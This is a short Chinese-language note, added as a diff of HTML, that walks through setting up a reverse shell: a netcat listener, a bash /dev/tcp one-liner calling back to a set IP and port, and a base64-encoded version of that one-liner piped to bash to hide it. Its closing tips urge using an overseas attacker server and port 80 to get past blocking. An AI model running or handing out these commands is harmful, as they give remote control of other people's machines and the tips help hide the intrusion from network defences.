@@ -1,0 +1,23 @@
+<p>反弹shell , 超级强大， 英文 reverse shell （反向shell )&#160;</p>
+<p>参考</p>
+<p>在线生成器：<a href="https://shellgenerator.github.io">https://shellgenerator.github.io</a>
+</p>
+<p>这个简直太强大了！</p>
+<p>1. 在本地搭建好一个 reverse shell server:&#160; &#160;nc -nvlp 5000</p>
+<p>这就表示，你的本地已经有5000端口在监听从外面发过来的 请求了。&#160;</p>
+<p>此时屏幕是冻结的（等待中）</p>
+<p>2. 在远程，可以运行任意命令（见上面的在线生成器）.&#160; 例如；</p>
+<p>bash -i &gt;&amp; /dev/tcp/172.17.211.247/5000 0&gt;&amp;1</p>
+<p>3. 在本地，就会发现，已经登录了远程服务器了。 操作跟本地shell是一样一样的！&#160; 太牛了！</p>
+<p>几个例子</p>
+<p>1. 转换</p>
+<p>$ echo "/bin/bash -i &gt;&amp; /dev/tcp/172.17.211.247/5000 0&gt;&amp;1" | base64
+</p>
+<p>L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE3Mi4xNy4yMTEuMjQ3LzUwMDAgMD4mMQo=</p>
+<p>$ echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE3Mi4xNy4yMTEuMjQ3LzUwMDAgMD4mMQo= | base64 -d | bash
+</p>
+<p>就可以运行了。</p>
+<h1>心得</h1>
+<p>1. attacker server 端口要全部开启，或者使用80端口</p>
+<p>2. 找个境外的服务器</p>
+<p>3. 先测试一下该server ip在国内是否可以访问的通</p>
